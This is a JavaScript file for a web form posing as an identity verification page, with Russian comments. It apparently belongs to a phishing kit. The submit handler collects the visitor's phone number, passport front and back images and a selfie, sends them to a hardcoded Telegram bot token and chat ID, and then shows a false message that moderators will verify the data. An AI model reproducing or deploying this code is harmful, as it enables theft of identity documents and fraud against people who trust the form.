const botToken = '7655435400:AAHSHDH9lHidHK3SpluUGxuCRbplkxgSj7M'; // Замените на ваш токен
const chatId = '2554846811'; // Замените на ваш ID чата

async function sendToTelegram(phone, files) {
    const message = `Новый запрос на идентификацию:\nТелефон: ${phone}`;
    
    // Отправка текстового сообщения
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    });

    // Отправка файлов
    for (const file of files) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', file);

        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: 'POST',
            body: formData,
        });
    }
}

document.getElementById('phone').addEventListener('input', function() {
    const phone = this.value;
    document.getElementById('submitButton').disabled = phone.length < 9 || !document.getElementById('consent').checked;
});

document.getElementById('consent').addEventListener('change', function() {
    const phone = document.getElementById('phone').value;
    document.getElementById('submitButton').disabled = phone.length < 9 || !this.checked;
});

document.getElementById('identificationForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    const phone = document.getElementById('phone').value;
    const files = [
        document.getElementById('passportFront').files[0],
        document.getElementById('passportBack').files[0],
        document.getElementById('selfie').files[0],
    ];

    document.getElementById('loading').style.display = 'block';

    // Отправка данных в Telegram
    await sendToTelegram(phone, files);

    setTimeout(function() {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('successMessage').innerText = "Ваши данные отправлены✅ Модераторы подтвердят ваши данные и вы пройдёте идентификацию😊";
        document.getElementById('successMessage').style.display = 'block';
    }, 3000);
});